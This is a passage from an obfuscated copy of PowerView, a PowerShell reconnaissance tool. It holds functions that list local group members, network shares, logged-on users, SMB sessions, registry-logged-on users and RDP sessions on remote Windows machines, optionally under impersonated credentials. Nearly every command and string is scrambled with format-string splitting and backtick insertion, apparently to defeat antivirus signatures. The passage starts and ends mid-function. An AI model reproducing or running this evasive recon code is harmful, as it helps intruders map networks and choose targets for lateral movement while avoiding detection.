                            &("{1}{3}{0}{2}" -f 'ite-Ver','W','bose','r') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${m`em`BER} = &("{0}{1}{2}{3}"-f'N','ew-','Obje','ct') ("{0}{2}{1}" -f'PS','bject','O')
                            ${me`m`BeR} | &("{1}{0}{2}"-f'-Membe','Add','r') ("{3}{2}{1}{0}" -f 'y','propert','e','Not') ("{0}{2}{1}{3}"-f'Comp','terNa','u','me') ${C`omput`eR}
                            ${MeM`BEr} | &("{1}{0}{2}" -f 'd-M','Ad','ember') ("{3}{2}{0}{1}" -f 't','eproperty','o','N') ("{1}{0}{2}"-f 'ou','Gr','pName') ${groUp`NA`ME}
                            ${MEM`BeR} | &("{0}{2}{3}{1}" -f 'Add-','er','Mem','b') ("{1}{0}{2}" -f 't','Noteproper','y') ("{0}{2}{1}"-f 'Me','me','mberNa') ${I`NfO}."L`gR`M`I2_`Do`maI`NAnDNAME"
                            ${MEm`B`Er} | &("{0}{1}{2}" -f 'Add-M','em','ber') ("{2}{3}{0}{1}" -f'rope','rty','Not','ep') 'SID' ${SiDST`R`inG}
                            ${I`SGrO`UP} = $(${in`Fo}."LGRM`i`2_Si`duSAge" -eq ("{2}{1}{0}{3}"-f 'u','Gro','SidType','p'))
                            ${M`e`MBEr} | &("{2}{0}{1}" -f'dd-Mem','ber','A') ("{1}{2}{0}"-f 'y','Notepro','pert') ("{1}{0}" -f 'p','IsGrou') ${I`sGr`oup}
                            ${Me`M`Ber}."psob`j`eCt"."tY`penAm`eS".("{1}{0}" -f'rt','Inse').Invoke(0, ("{7}{6}{5}{0}{4}{2}{1}{3}" -f 'Lo','AP','GroupMember.','I','cal','View.','r','Powe'))
                            ${Me`MBers} += ${mEm`B`ER}
                        }
                    }

                    
                    ${N`Ull} = ${NEt`Ap`i32}::("{0}{2}{3}{1}"-f 'NetApiB','ree','uffe','rF').Invoke(${pTri`N`Fo})

                    
                    ${MACHi`NE`sID} = ${m`E`MBeRs} | &("{0}{2}{1}{3}"-f 'Wher','c','e-Obje','t') {${_}."s`id" -match ("{2}{0}{1}" -f'*-50','0','.') -or (${_}."S`id" -match ("{1}{0}"-f'-501','.*'))} | &("{1}{3}{2}{0}" -f'ect','Sel','bj','ect-O') -Expand ("{1}{0}"-f'ID','S')
                    if (${M`AcHi`NEsiD}) {
                        ${M`A`cH`iNesID} = ${Ma`ch`inE`sid}.("{0}{1}{2}"-f 'Sub','s','tring').Invoke(0, ${M`AChI`NeSiD}.("{2}{1}{0}"-f'exOf','Ind','Last').Invoke('-'))

                        ${ME`mbE`Rs} | &("{4}{0}{2}{3}{1}" -f 'or','h-Object','Ea','c','F') {
                            if (${_}."s`Id" -match ${MaC`HiN`Esid}) {
                                ${_} | &("{2}{0}{1}"-f'-','Member','Add') ("{2}{3}{1}{0}"-f'perty','pro','N','ote') ("{2}{0}{1}"-f 'o','main','IsD') ${Fa`Lse}
                            }
                            else {
                                ${_} | &("{1}{0}{2}"-f'd-Me','Ad','mber') ("{3}{2}{0}{1}" -f'epr','operty','t','No') ("{0}{2}{1}"-f'IsDo','n','mai') ${tR`Ue}
                            }
                        }
                    }
                    else {
                        ${M`EMB`ERS} | &("{0}{2}{3}{4}{1}" -f 'F','t','orEach-','Obje','c') {
                            if (${_}."S`Id" -notmatch ("{0}{1}{2}"-f 'S-1-','5-','21')) {
                                ${_} | &("{1}{3}{2}{0}"-f 'r','Add-','mbe','Me') ("{0}{1}{3}{2}"-f 'Notepr','op','y','ert') ("{1}{2}{0}"-f'ain','I','sDom') ${fa`lSE}
                            }
                            else {
                                ${_} | &("{0}{2}{1}"-f 'A','er','dd-Memb') ("{2}{1}{3}{0}"-f 'property','ot','N','e') ("{2}{1}{0}"-f'n','i','IsDoma') ("{2}{1}{0}" -f'OWN','N','UNK')
                            }
                        }
                    }
                    ${mEMbe`Rs}
                }
                else {
                    &("{2}{3}{1}{0}"-f'bose','er','Writ','e-V') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
                    ${G`R`O`UPprOVider} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${gr`ouPPr`oV`i`deR}."PsB`AsE"."iNVO`KE"(("{0}{1}" -f 'Member','s')) | &("{2}{1}{0}{3}{4}"-f'-','h','ForEac','Obje','ct') {

                        ${M`emb`eR} = &("{2}{1}{0}{3}" -f'ec','ew-Obj','N','t') ("{0}{2}{1}" -f 'PSO','t','bjec')
                        ${mE`m`Ber} | &("{2}{1}{0}"-f 'er','mb','Add-Me') ("{3}{2}{0}{1}" -f't','y','proper','Note') ("{1}{2}{3}{0}"-f 'me','Comput','erN','a') ${c`OmPUT`eR}
                        ${mEm`BER} | &("{1}{3}{0}{2}" -f'M','Add','ember','-') ("{3}{1}{2}{0}" -f 'perty','ot','epro','N') ("{1}{0}" -f 'roupName','G') ${G`ROuP`NAMe}

                        ${L`Ocal`US`Er} = ([ADSI]${_})
                        ${aD`sPa`Th} = ${LoCaL`US`er}.("{1}{2}{0}"-f't','In','vokeGe').Invoke(("{1}{0}{2}" -f'sP','Ad','ath')).("{1}{0}" -f'e','Replac').Invoke(("{2}{1}{0}" -f 'T://','N','Win'), '')
                        ${I`sG`Roup} = (${LO`caL`USeR}."scHeM`A`c`LASS`NAme" -like ("{0}{1}" -f 'gr','oup'))

                        if((  ${u`5e}::("{0}{1}" -f 'M','atches').Invoke(${AdsP`A`TH}, '/'))."c`oUnt" -eq 1) {
                            
                            ${M`em`BE`RIS`DoMain} = ${tR`UE}
                            ${nA`mE} = ${Ads`P`AtH}.("{0}{1}"-f 'R','eplace').Invoke('/', '\')
                        }
                        else {
                            
                            ${memB`E`R`IsdoMA`In} = ${FA`lSE}
                            ${N`AMe} = ${A`dSPA`TH}.("{0}{2}{1}" -f'Su','ing','bstr').Invoke(${A`D`SPAth}.("{0}{1}"-f'Ind','exOf').Invoke('/')+1).("{1}{2}{0}" -f 'e','Re','plac').Invoke('/', '\')
                        }

                        ${m`EmbeR} | &("{2}{0}{3}{1}"-f'Mem','er','Add-','b') ("{3}{2}{1}{0}"-f'ty','per','otepro','N') ("{1}{2}{0}{3}" -f'N','A','ccount','ame') ${n`AmE}
                        ${M`eMBer} | &("{0}{1}{2}" -f 'Ad','d-M','ember') ("{1}{2}{0}"-f'y','Notep','ropert') 'SID' ((&("{2}{0}{1}{3}" -f 'Obj','ec','New-','t') ("{8}{7}{0}{3}{5}{6}{2}{9}{4}{1}{10}" -f 'Securit','yIdentif','cipal.','y.P','urit','r','in','tem.','Sys','Sec','ier')(${LOcALU`S`Er}.("{1}{0}{2}" -f 'G','Invoke','et').Invoke(("{0}{1}{2}" -f 'Object','S','ID')),0))."VAl`UE")
                        ${MemB`eR} | &("{0}{2}{1}"-f'Add-','r','Membe') ("{2}{0}{1}"-f 'e','property','Not') ("{2}{0}{1}" -f 'sG','roup','I') ${Is`gR`OUp}
                        ${Me`m`BeR} | &("{2}{3}{0}{1}" -f'embe','r','A','dd-M') ("{0}{1}{2}"-f 'N','otepr','operty') ("{0}{1}{2}" -f'Is','D','omain') ${M`E`MbeR`IsDom`Ain}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        ${me`mBEr}
                    }
                }
                catch {
                    &("{0}{1}{2}"-f 'Wr','ite-V','erbose') ('[G'+'et-Net'+'L'+'ocalGrou'+'pMemb'+'er] '+'E'+'rro'+'r '+'for'+' '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if (${lOg`ON`TOK`eN}) {
            &("{3}{1}{2}{0}"-f'rtToSelf','voke-','Reve','In') -TokenHandle ${Lo`gO`NTO`kEn}
        }
    }
}


function GE`T-nETs`HarE {


    [OutputType({"{1}{0}{3}{2}{4}" -f 'owerVi','P','Sh','ew.','areInfo'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIon = 0, VaLuEfrompIpElINe = ${T`RuE}, ValuEfroMpiPElINEBYproPERTyNAMe = ${Tr`UE})]
        [Alias({"{2}{0}{1}"-f 'm','e','HostNa'}, {"{3}{2}{1}{0}" -f'hostname','s','n','d'}, {"{1}{0}"-f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`MP`UTeRNA`me} = ("{0}{2}{1}" -f 'l','host','ocal'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`d`EnTi`Al} =  (gEt-chIlditem  ("va"+"r"+"IABlE"+":7tQ02"))."Val`UE"::"em`pTy"
    )

    BEGIN {
        if (${psbOUnD`pA`R`A`m`eTErs}[("{0}{1}{3}{2}" -f 'Crede','nt','al','i')]) {
            ${Log`ontO`KeN} = &("{3}{1}{0}{5}{4}{6}{2}"-f'e-UserI','ok','ation','Inv','erso','mp','n') -Credential ${Cr`eDeNt`I`AL}
        }
    }

    PROCESS {
        ForEach (${COm`PU`TER} in ${C`OmPUTerna`mE}) {
            
            ${QueRy`lE`VeL} = 1
            ${PTr`In`FO} =   (  Get-varIABLE ("zFV"+"W1") )."v`ALuE"::"Z`ero"
            ${e`NtriesrE`AD} = 0
            ${t`OtaLr`ead} = 0
            ${ReSum`EH`An`dlE} = 0

            
            ${rES`U`LT} = ${N`eta`PI32}::"n`ETShA`R`eEnum"(${COMpU`T`eR}, ${QUEr`Ylev`EL}, [ref]${PTrin`FO}, -1, [ref]${E`NTR`i`ESREad}, [ref]${TOtaL`Re`AD}, [ref]${RESu`mEh`AndLe})

            
            ${O`FFsEt} = ${P`TrI`NFO}.("{0}{1}"-f 'ToIn','t64').Invoke()

            
            if ((${rES`ULT} -eq 0) -and (${oF`Fset} -gt 0)) {

                
                ${inc`R`emenT} = ${S`H`Are_INfO`_1}::("{2}{1}{0}" -f'ze','i','GetS').Invoke()

                
                for (${I} = 0; (${I} -lt ${e`NtRIEs`R`EAd}); ${i}++) {
                    
                    ${n`e`WINTPtR} = &("{2}{1}{0}"-f 'ct','ew-Obje','N') ("{1}{2}{0}" -f'Intptr','Syst','em.') -ArgumentList ${OFfS`et}
                    ${I`NfO} = ${ne`w`inTPTr} -as ${SHa`RE`_iNFO_1}

                    
                    ${sH`ARe} = ${i`NFo} | &("{1}{3}{2}{0}" -f'ct','S','t-Obje','elec') ('*')
                    ${S`HArE} | &("{1}{0}{2}"-f'd-Me','Ad','mber') ("{1}{0}{2}" -f'eprope','Not','rty') ("{0}{1}{2}" -f'Co','m','puterName') ${CO`m`puTeR}
                    ${Sha`Re}."PsO`B`ject"."tyPeNa`M`ES".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{2}{1}{3}{0}" -f 'eInfo','View','Power','.Shar'))
                    ${O`FFsEt} = ${n`EWiNtP`TR}.("{1}{2}{0}"-f 'nt64','T','oI').Invoke()
                    ${OF`F`Set} += ${I`NC`REment}
                    ${s`haRe}
                }

                
                ${N`UlL} = ${neTaPi`32}::("{2}{1}{3}{0}"-f'ferFree','u','NetApiB','f').Invoke(${P`TrIn`Fo})
            }
            else {
                &("{0}{2}{1}{3}"-f'Wr','te-','i','Verbose') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${LOG`OnTO`KEN}) {
            &("{0}{2}{4}{1}{3}"-f'Invo','-Rever','k','tToSelf','e') -TokenHandle ${lo`G`OnTok`eN}
        }
    }
}


function g`Et-n`Et`LOggED`on {


    [OutputType({"{0}{1}{2}{5}{4}{3}"-f 'Pow','erVie','w.L','nfo','ggedOnUserI','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsition = 0, vAluEFROMpiPeLine = ${t`RuE}, VALuefRoMPIPElINebyProPeRtynAmE = ${T`RUE})]
        [Alias({"{1}{0}" -f 'ostName','H'}, {"{2}{1}{0}"-f 'tname','hos','dns'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COM`p`UtEr`NAMe} = ("{1}{0}{2}"-f'lh','loca','ost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`eNtI`AL} =  ${7T`q02}::"eMp`TY"
    )

    BEGIN {
        if (${ps`B`ou`NDPaRA`me`TERs}[("{1}{2}{0}"-f 'dential','C','re')]) {
            ${L`ogO`NtOk`En} = &("{5}{0}{6}{4}{2}{3}{1}"-f'e-U','ion','persona','t','Im','Invok','ser') -Credential ${C`ReD`e`Ntial}
        }
    }

    PROCESS {
        ForEach (${C`o`mpuTEr} in ${C`OMP`UTEr`N`AME}) {
            
            ${qUE`Ryl`eV`el} = 1
            ${P`Trin`Fo} =  (  vAriaBlE  ("{1}{0}"-f'VW1','ZF')  -valueONlY )::"Z`ero"
            ${ENtR`iEs`Re`Ad} = 0
            ${TOtALR`E`Ad} = 0
            ${reS`U`mEHaNdlE} = 0

            
            ${ReS`U`lT} = ${nEtaP`i`32}::"nETwkST`AUs`EReN`Um"(${cO`M`puTer}, ${q`U`Eryle`VEl}, [ref]${PT`RI`NFo}, -1, [ref]${eN`Tr`IeS`ReAD}, [ref]${TotaL`R`eAD}, [ref]${ReSumE`HaN`dLE})

            
            ${O`FF`Set} = ${ptR`infO}.("{0}{1}" -f'ToI','nt64').Invoke()

            
            if ((${re`S`ULT} -eq 0) -and (${of`F`SEt} -gt 0)) {

                
                ${iNcr`EME`NT} = ${WK`s`T`A_User`_InFo`_1}::("{1}{0}"-f'etSize','G').Invoke()

                
                for (${i} = 0; (${i} -lt ${eN`TriEs`R`ead}); ${i}++) {
                    
                    ${n`e`W`iNTptr} = &("{0}{3}{1}{2}" -f'Ne','b','ject','w-O') ("{0}{4}{2}{3}{1}" -f'Syst','tptr','.I','n','em') -ArgumentList ${of`F`SeT}
                    ${I`NFO} = ${NEW`iN`TP`Tr} -as ${W`KstA_use`R_Info`_1}

                    
                    ${lo`ggeD`ON} = ${In`FO} | &("{3}{2}{1}{0}"-f 'ct','e','ect-Obj','Sel') ('*')
                    ${log`g`edOn} | &("{1}{2}{0}"-f'mber','Add-','Me') ("{0}{1}{2}" -f'Not','e','property') ("{2}{1}{0}{3}" -f 'r','e','Comput','Name') ${COM`p`UTer}
                    ${LoGg`ed`ON}."ps`oB`JeCT"."tYpEn`A`mes".("{0}{1}" -f'Ins','ert').Invoke(0, ("{6}{2}{3}{4}{0}{5}{1}"-f 'ew.Logge','nfo','ow','er','Vi','dOnUserI','P'))
                    ${oF`FSet} = ${NEwi`Nt`PTR}.("{1}{0}"-f'4','ToInt6').Invoke()
                    ${of`Fs`et} += ${IN`Cr`EmEnt}
                    ${LoGG`eD`On}
                }

                
                ${n`UlL} = ${nET`ApI32}::("{0}{1}{3}{2}{4}" -f'N','e','f','tApiBu','ferFree').Invoke(${Pt`RinFO})
            }
            else {
                &("{2}{1}{0}{3}"-f'o','-Verb','Write','se') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${loG`oN`TO`kEn}) {
            &("{2}{1}{5}{3}{4}{0}" -f 'f','n','I','-Rever','tToSel','voke') -TokenHandle ${Log`ONT`oKEn}
        }
    }
}


function gET-NEt`Ses`s`ION {


    [OutputType({"{5}{3}{1}{4}{0}{2}" -f 'onIn','s','fo','.Ses','i','PowerView'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItiOn = 0, vAluEFROmPipELine = ${Tr`UE}, vAlueFroMPipeLiNEBYproPeRtyName = ${tr`Ue})]
        [Alias({"{2}{1}{0}"-f 'e','Nam','Host'}, {"{0}{1}{2}{3}"-f 'd','n','shostna','me'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cO`MpU`T`eRNA`ME} = ("{0}{2}{1}"-f'localho','t','s'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDE`N`TIAl} =  ( CHILDITeM ("{1}{3}{0}{4}{2}"-f'riaBLe:7','v','2','a','tQ0') )."Va`LuE"::"eMP`TY"
    )

    BEGIN {
        if (${PSBOUndpa`RA`metE`RS}[("{1}{0}{2}"-f 're','C','dential')]) {
            ${Lo`goN`Tok`eN} = &("{3}{0}{2}{1}{5}{4}"-f 'n','serImperson','voke-U','I','ion','at') -Credential ${c`REd`ENtiaL}
        }
    }

    PROCESS {
        ForEach (${cOm`PU`TER} in ${coM`P`Ut`ERNA`mE}) {
            
            ${QU`E`RY`leveL} = 10
            ${Pt`Ri`Nfo} =   ${ZFV`W1}::"Z`ErO"
            ${e`NtRI`EsRead} = 0
            ${TOt`ALr`e`AD} = 0
            ${rEs`UM`e`hA`Ndle} = 0

            
            ${rE`s`ULt} = ${ne`TapI`32}::"N`Ets`ESsIONE`N`UM"(${COmpu`T`eR}, '', ${u`serNA`me}, ${que`R`yL`Evel}, [ref]${P`TrI`NfO}, -1, [ref]${e`NTRiE`SrE`AD}, [ref]${tOtaL`RE`Ad}, [ref]${rES`UMEHa`NdlE})

            
            ${Off`s`et} = ${p`TRin`Fo}.("{0}{1}" -f 'To','Int64').Invoke()

            
            if ((${RE`S`Ult} -eq 0) -and (${oFfS`et} -gt 0)) {

                
                ${I`NC`Rement} = ${SE`Ss`iON_iNf`o_10}::("{0}{1}"-f'Ge','tSize').Invoke()

                
                for (${I} = 0; (${i} -lt ${ENtRI`e`sR`EAD}); ${I}++) {
                    
                    ${n`EWInt`ptr} = &("{1}{2}{0}" -f't','New-Ob','jec') ("{2}{1}{0}"-f 'r','em.Intpt','Syst') -ArgumentList ${O`FF`SET}
                    ${I`NFo} = ${NEwIn`T`Ptr} -as ${Ses`sioN`_infO_`10}

                    
                    ${Ses`s`IoN} = ${iN`FO} | &("{2}{0}{4}{1}{3}" -f 'ele','t-Obje','S','ct','c') ('*')
                    ${sE`SsiON} | &("{1}{0}{2}" -f'Mem','Add-','ber') ("{1}{2}{0}" -f 'erty','No','teprop') ("{2}{0}{1}"-f 'erN','ame','Comput') ${C`O`MpUteR}
                    ${S`Es`SIon}."psOBjE`Ct"."T`YPe`NamES".("{1}{0}" -f'sert','In').Invoke(0, ("{4}{1}{2}{0}{3}"-f'nInf','r','View.Sessio','o','Powe'))
                    ${o`Ff`SeT} = ${n`E`wiNTP`Tr}.("{0}{1}{2}" -f'To','I','nt64').Invoke()
                    ${Off`sET} += ${i`NCr`emE`Nt}
                    ${se`sSi`oN}
                }

                
                ${n`ULL} = ${NET`A`pi32}::("{2}{1}{0}{3}" -f 'uff','ApiB','Net','erFree').Invoke(${PtR`InFo})
            }
            else {
                &("{1}{2}{0}" -f'ose','Write-','Verb') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if (${loGO`Nt`oKEN}) {
            &("{0}{2}{4}{1}{3}"-f'Invoke','o','-Rev','Self','ertT') -TokenHandle ${LOg`ON`TOken}
        }
    }
}


function Ge`T-REGL`oggE`Don {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f'ouldP','P','rocess','SSh'}, '')]
    [OutputType({"{5}{2}{0}{4}{1}{3}{7}{6}" -f'w.R','o','e','gged','egL','PowerVi','ser','OnU'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsition = 0, vAlUefROMpipeLinE = ${t`RUE}, vAlUEfROMPipEliNEBYprOPerTyNAME = ${Tr`UE})]
        [Alias({"{1}{0}"-f 'e','HostNam'}, {"{2}{0}{1}"-f 'stnam','e','dnsho'}, {"{0}{1}" -f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`OMPu`TE`RnAMe} = ("{1}{0}"-f'ost','localh')
    )

    BEGIN {
        if (${psb`Ou`Ndpa`RA`me`TERS}[("{0}{2}{1}" -f 'Cred','ntial','e')]) {
            ${L`oGOn`T`OkEn} = &("{1}{0}{2}{6}{5}{3}{4}"-f'e-U','Invok','se','rs','onation','pe','rIm') -Credential ${cRede`NTi`Al}
        }
    }

    PROCESS {
        ForEach (${coMP`UT`Er} in ${coMP`UtEr`Na`mE}) {
            try {
                
                ${r`eg} =  (  vARiAblE ('E'+'n0f')  -VAlueONL)::("{3}{2}{1}{0}"-f'aseKey','teB','emo','OpenR').Invoke(("{1}{0}"-f's','User'), "$ComputerName")

                
                ${R`EG}.("{0}{2}{1}{3}"-f 'G','bKey','etSu','Names').Invoke() | &("{0}{1}{3}{2}" -f'W','h','ject','ere-Ob') { ${_} -match ((('S-'+'1-5-'+'2'+'1'+'-[0-9'+']+-[0-9]+'+'-['+'0-9]'+'+-'+'[0'+'-9]+Upb')-rePlAce 'Upb',[chaR]36)) } | &("{3}{1}{2}{0}"-f'ct','Each-Obj','e','For') {
                    ${us`E`RNAMe} = &("{2}{1}{3}{0}" -f'm-SID','e','Conv','rtFro') -ObjectSID ${_} -OutputType ("{1}{2}{0}{3}" -f 'mainSim','D','o','ple')

                    if (${us`eRName}) {
                        ${U`ser`NAME}, ${U`SErD`o`MAin} = ${uS`ERNa`ME}.("{1}{0}"-f 'plit','S').Invoke('@')
                    }
                    else {
                        ${US`eR`Na`Me} = ${_}
                        ${U`SERdo`m`AiN} = ${nu`LL}
                    }

                    ${reG`Lo`g`GEdoNUser} = &("{0}{2}{1}"-f'New-','ect','Obj') ("{0}{1}"-f 'PS','Object')
                    ${Re`Gl`oGGeDoN`Us`eR} | &("{1}{0}{2}"-f'Memb','Add-','er') ("{3}{1}{2}{0}"-f'y','eprope','rt','Not') ("{3}{0}{1}{2}" -f 'terN','am','e','Compu') "$ComputerName"
                    ${rE`G`LO`GgED`OnUseR} | &("{2}{1}{0}" -f'-Member','dd','A') ("{1}{2}{0}" -f'perty','Notepr','o') ("{2}{0}{1}" -f 'erDoma','in','Us') ${Use`R`DOMaiN}
                    ${regl`oG`GeD`O`NUseR} | &("{2}{1}{0}"-f'er','d-Memb','Ad') ("{1}{2}{0}"-f'rty','Noteprop','e') ("{0}{1}{2}" -f 'UserN','am','e') ${U`SerNA`mE}
                    ${R`E`GLOGgEDonUSEr} | &("{2}{1}{0}{3}" -f 'b','d-Mem','Ad','er') ("{2}{1}{3}{0}" -f'perty','e','Not','pro') ("{0}{1}{2}"-f 'Use','r','SID') ${_}
                    ${R`e`G`LOG`gedONu`SeR}."p`SObJe`cT"."tYp`ENa`MeS".("{0}{1}"-f 'In','sert').Invoke(0, ("{2}{0}{4}{3}{1}"-f'Vie','dOnUser','Power','ge','w.RegLog'))
                    ${re`GLOGgEDO`NU`s`eR}
                }
            }
            catch {
                &("{2}{0}{1}" -f 'e-','Verbose','Writ') ('['+'Get-RegLoggedOn'+']'+' '+'Erro'+'r'+' '+'openin'+'g'+' '+'re'+'mote'+' '+'regist'+'ry'+' '+'on'+' '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if (${LO`gontoK`eN}) {
            &("{6}{5}{2}{0}{1}{4}{3}" -f'e-R','evertTo','k','elf','S','nvo','I') -TokenHandle ${LOG`O`NtOkeN}
        }
    }
}


function GE`T-`NeTrd`pSEsSIoN {


    [OutputType({"{2}{4}{0}{5}{3}{1}"-f'.','o','Po','SessionInf','werView','RDP'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTION = 0, vALUEFROmPipelinE = ${tr`UE}, ValuefromPipeLiNebYPropErTyNaME = ${tr`Ue})]
        [Alias({"{1}{0}{2}"-f 'ostN','H','ame'}, {"{2}{0}{1}"-f 'st','name','dnsho'}, {"{1}{0}"-f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoMpU`TerNA`mE} = ("{1}{0}"-f 'lhost','loca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRED`eN`T`IAL} =  ( DiR ("{3}{2}{0}{1}"-f'A','Ble:7Tq02','i','VAR')  )."Va`lue"::"EM`PTY"
    )

    BEGIN {
        if (${PsBO`UND`ParA`mETeRS}[("{2}{1}{0}" -f'tial','n','Crede')]) {
            ${L`OgoN`ToKen} = &("{0}{2}{5}{4}{6}{3}{1}" -f 'I','ersonation','nvo','p','e','ke-Us','rIm') -Credential ${CRed`E`Nti`Al}
        }
    }

    PROCESS {
        ForEach (${Com`pU`TeR} in ${CO`MP`UTErNAME}) {

            
            ${hAn`d`LE} = ${w`Ts`ApI32}::("{4}{1}{3}{0}{2}" -f 'r','enS','Ex','erve','WTSOp').Invoke(${C`oMPUt`Er})

            
            if (${ha`Nd`lE} -ne 0) {

                
                ${ppsesS`iO`Ni`N`FO} =  ( geT-CHilDiteM ('v'+'aRIA'+'B'+'LE'+':ZFvw1'))."va`LUE"::"Z`ero"
                ${p`CO`Unt} = 0

                
                ${rES`U`lt} = ${W`Ts`A`PI32}::"WTsENUm`eRATe`SeSsioNs`Ex"(${HA`N`DlE}, [ref]1, 0, [ref]${p`ps`E`SSio`NINfO}, [ref]${Pc`o`UNT});${laSte`R`RoR} =   (GEt-VaRIABLE ("{1}{0}"-f 'zS','vp')  )."vA`lUe"::("{1}{3}{2}{0}"-f'r','GetLastWin','o','32Err').Invoke()

                
                ${o`FfseT} = ${pPSE`SSio`Ni`NFO}.("{2}{0}{1}"-f'oInt6','4','T').Invoke()

                if ((${r`eS`UlT} -ne 0) -and (${o`FfseT} -gt 0)) {

                    
                    ${i`N`crEmENt} = ${w`TS_SessIoN_i`NF`o_1}::("{0}{1}" -f 'Ge','tSize').Invoke()

                    
                    for (${I} = 0; (${i} -lt ${pCoU`NT}); ${i}++) {

                        
                        ${Ne`W`IntPTR} = &("{1}{2}{0}" -f't','N','ew-Objec') ("{3}{1}{0}{2}"-f '.In','stem','tptr','Sy') -ArgumentList ${o`Ff`SET}
                        ${i`NfO} = ${n`ewiNt`pTR} -as ${Wt`S_SeSSI`ON`_`i`Nfo`_1}

                        ${rDPS`eSS`I`oN} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{0}{2}{1}" -f'PSOb','ect','j')

                        if (${iN`Fo}."P`Ho`s`TNAmE") {
                            ${rD`Ps`Ess`iOn} | &("{1}{0}{2}" -f 'mb','Add-Me','er') ("{1}{0}{3}{2}" -f'pr','Note','erty','op') ("{1}{0}{2}" -f 'uterNam','Comp','e') ${IN`FO}."p`Ho`sTnaME"
                        }
                        else {
                            
                            ${rdPsE`S`S`ioN} | &("{0}{3}{1}{2}"-f 'Add','Memb','er','-') ("{2}{1}{0}{3}" -f 'prop','e','Not','erty') ("{1}{3}{0}{2}" -f 'am','C','e','omputerN') ${C`OmPU`TEr}
                        }

                        ${R`dP`seSsi`oN} | &("{1}{0}{2}"-f'-Memb','Add','er') ("{2}{1}{0}"-f 'ty','roper','Notep') ("{1}{0}{2}"-f'ionNam','Sess','e') ${In`Fo}."psES`s`IONNaME"

                        if ($(-not ${IN`Fo}."PdomA`I`N`NAmE") -or (${i`NfO}."pd`Om`A`innAMe" -eq '')) {
                            
                            ${RD`pseSs`IOn} | &("{1}{0}{2}" -f'M','Add-','ember') ("{2}{0}{3}{1}"-f 'p','perty','Note','ro') ("{1}{2}{0}" -f'me','UserN','a') "$($Info.pUserName)"
                        }
                        else {
                            ${RDP`s`e`SsiON} | &("{1}{0}{2}" -f'dd-M','A','ember') ("{1}{0}{2}{3}" -f 'ot','N','epr','operty') ("{0}{1}"-f'User','Name') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${rDp`SeSs`iOn} | &("{0}{2}{1}" -f'Ad','mber','d-Me') ("{1}{3}{0}{2}"-f'o','No','perty','tepr') 'ID' ${i`NfO}."seS`SiO`NiD"
                        ${Rd`Psessi`oN} | &("{0}{1}{2}"-f 'Add-M','em','ber') ("{2}{1}{3}{0}" -f'y','ro','Notep','pert') ("{0}{1}"-f 'S','tate') ${IN`FO}."stA`TE"

                        ${PPBu`FF`Er} =   (GCI  ("{2}{3}{0}{1}"-f 'AbLE:zFVW','1','Va','rI')  )."vaL`UE"::"zE`Ro"
                        ${pB`ytesrE`TuR`Ned} = 0

                        
                        
                        ${reS`U`Lt2} = ${WtS`A`PI32}::"WtSqUER`ysESsioNi`N`For`M`At`ioN"(${HA`N`DLe}, ${iN`Fo}."S`Ess`IOn`ID", 14, [ref]${PpbuF`F`er}, [ref]${PbYtEsr`etU`RNED});${lA`StER`R`oR2} =  ${V`pZs}::("{1}{2}{3}{4}{0}"-f 'r','Ge','tLastWi','n32','Erro').Invoke()

                        if (${R`eSu`lT2} -eq 0) {
                            &("{1}{2}{0}"-f 'rbose','Wri','te-Ve') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            ${OFf`S`et2} = ${pP`Buf`FeR}.("{0}{1}" -f'ToInt','64').Invoke()
                            ${NEw`InT`PTR2} = &("{2}{3}{0}{1}" -f 'c','t','New-Obj','e') ("{3}{1}{4}{0}{2}"-f 'nt','em.','ptr','Syst','I') -ArgumentList ${o`F`Fset2}
                            ${IN`FO2} = ${new`iN`T`ptr2} -as ${wTs`_ClIe`Nt_A`ddREsS}

                            ${sour`ce`ip} = ${i`NFo2}."a`DdR`esS"
                            if (${sOU`RCeip}[2] -ne 0) {
                                ${S`Ourc`Eip} = [String]${s`our`ce`ip}[2]+'.'+[String]${so`U`RC`EIp}[3]+'.'+[String]${Sour`CEiP}[4]+'.'+[String]${s`oU`RceIp}[5]
                            }
                            else {
                                ${sOU`Rc`eip} = ${NU`LL}
                            }

